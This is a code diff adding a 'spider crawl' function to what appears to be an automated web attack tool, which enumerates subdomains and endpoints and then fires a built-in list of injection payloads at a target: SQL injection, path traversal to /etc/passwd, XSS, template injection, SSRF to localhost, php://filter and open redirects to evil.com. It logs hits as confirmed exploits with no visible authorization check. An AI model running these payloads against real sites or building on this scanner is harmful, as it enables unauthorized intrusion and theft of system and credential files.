@@ -2010,3 +2010,138 @@ async function getPhaseStrategy(phase: string, target: string, objective: string
   } catch {}
   return { strategy: 'default' };
 }
+
+// ===== SPIDER CRAWL: Deep endpoint/param/subdomain discovery =====
+async function spiderCrawlTarget(
+  target: string, depth: number, authHeader: string, supabase: any, userId: string
+): Promise<{
+  endpoints: string[]; parameters: string[]; subdomains: string[];
+  findings: Finding[]; output: string[];
+}> {
+  const output: string[] = [];
+  const endpoints = new Set<string>();
+  const parameters = new Set<string>();
+  const findings: Finding[] = [];
+  const startTime = Date.now();
+
+  output.push(`[SPIDER] Starting deep crawl of ${target} (depth: ${depth})`);
+
+  // Step 1: Subdomain enumeration
+  const subdomains = await enumerateSubdomains(target, authHeader);
+  output.push(`[SPIDER] Found ${subdomains.length} subdomains`);
+
+  // Step 2: Directory/endpoint discovery on main + subdomains
+  const allTargets = [target, ...subdomains.slice(0, 20)];
+  const dirScanTypes = ['directory', 'tech', 'headers'];
+  
+  for (const t of allTargets) {
+    for (const scanType of dirScanTypes) {
+      try {
+        const result = await callSecurityScan(scanType, t, authHeader);
+        if (result.success !== false) {
+          const scanFindings = extractFindings(result, scanType, 'spider', t);
+          findings.push(...scanFindings);
+          
+          // Extract endpoints from findings
+          for (const f of scanFindings) {
+            if (f.evidence?.raw?.url) endpoints.add(f.evidence.raw.url);
+            if (f.evidence?.raw?.path) endpoints.add(`${t}${f.evidence.raw.path}`);
+            if (f.evidence?.raw?.parameter) parameters.add(f.evidence.raw.parameter);
+          }
+        }
+      } catch {}
+    }
+  }
+
+  // Step 3: Common parameter extraction
+  const commonParams = ['id', 'q', 'search', 'page', 'url', 'file', 'path', 'redirect', 'callback',
+    'next', 'return', 'ref', 'token', 'key', 'user', 'email', 'name', 'action', 'cmd', 'type',
+    'sort', 'order', 'filter', 'category', 'lang', 'debug', 'test', 'admin', 'api_key'];
+  commonParams.forEach(p => parameters.add(p));
+
+  // Step 4: Test each parameter on each endpoint with OWASP-mapped payloads
+  const OWASP_PAYLOADS: Record<string, { payload: string; category: string }[]> = {
+    'id': [
+      { payload: "' OR 1=1--", category: 'A03-Injection' },
+      { payload: "1 UNION SELECT null,version()--", category: 'A03-Injection' },
+      { payload: "../../../etc/passwd", category: 'A01-Broken-Access' },
+    ],
+    'q': [
+      { payload: '<script>alert(1)</script>', category: 'A03-Injection' },
+      { payload: "{{7*7}}", category: 'A03-Injection' },
+    ],
+    'url': [
+      { payload: 'http://127.0.0.1:80', category: 'A10-SSRF' },
+      { payload: 'file:///etc/passwd', category: 'A01-Broken-Access' },
+    ],
+    'redirect': [
+      { payload: 'https://evil.com', category: 'A01-Broken-Access' },
+      { payload: '//evil.com', category: 'A01-Broken-Access' },
+    ],
+    'file': [
+      { payload: '../../../../etc/passwd', category: 'A01-Broken-Access' },
+      { payload: 'php://filter/convert.base64-encode/resource=index.php', category: 'A03-Injection' },
+    ],
+  };
+
+  output.push(`[SPIDER] Discovered ${endpoints.size} endpoints, ${parameters.size} parameters`);
+  output.push(`[SPIDER] Running OWASP-mapped payload tests...`);
+
+  // Test critical params with OWASP payloads
+  for (const [param, payloads] of Object.entries(OWASP_PAYLOADS)) {
+    if (!parameters.has(param)) continue;
+    for (const { payload, category } of payloads) {
+      try {
+        const response = await fetch(`${SUPABASE_URL}/functions/v1/attack-execution-loop`, {
+          method: 'POST',
+          headers: { 'Authorization': authHeader, 'Content-Type': 'application/json', 'apikey': SUPABASE_ANON_KEY },
+          body: JSON.stringify({
+            target, payloads: [{ raw: payload, encoded: encodeURIComponent(payload),
+              attackType: category, parameter: param, injectionPoint: 'query' }],
+            maxRetries: 3, techStack: [],
+          }),
+        });
+        if (response.ok) {
+          const result = await response.json();
+          if (result.successCount > 0) {
+            findings.push({
+              id: crypto.randomUUID(), type: category, severity: 'high',
+              title: `[SPIDER] ${category} via ?${param}=`,
+              description: `Spider found ${category} vulnerability on parameter "${param}"`,
+              evidence: { raw: { parameter: param, payload, poc: payload }, owasp: category },
+              timestamp: new Date().toISOString(), phase: 'spider',
+              tool_used: 'spider-crawler', exploitable: true,
+              exploit_confirmed: true, confidence: 0.9, verified: true,
+              poc_data: `OWASP: ${category}\nParam: ${param}\nPayload: ${payload}`,
+            });
+            output.push(`[SPIDER] ✅ ${category} on ?${param} — CONFIRMED`);
+          }
+        }
+      } catch {}
+    }
+  }
+
+  // Record to attack_attempts
+  if (findings.length > 0) {
+    try {
+      await supabase.from('attack_attempts').insert(
+        findings.map(f => ({
+          user_id: userId, target: f.subdomain || target,
+          attack_type: f.type, technique: 'spider-crawler',
+          success: true, output: f.description?.slice(0, 500),
+          metadata: { severity: f.severity, owasp: f.evidence?.owasp } as any,
+        }))
+      );
+    } catch {}
+  }
+
+  output.push(`[SPIDER] Complete: ${findings.length} findings in ${Date.now() - startTime}ms`);
+
+  return {
+    endpoints: Array.from(endpoints),
+    parameters: Array.from(parameters),
+    subdomains,
+    findings: deduplicateFindings(findings),
+    output,
+  };
+}
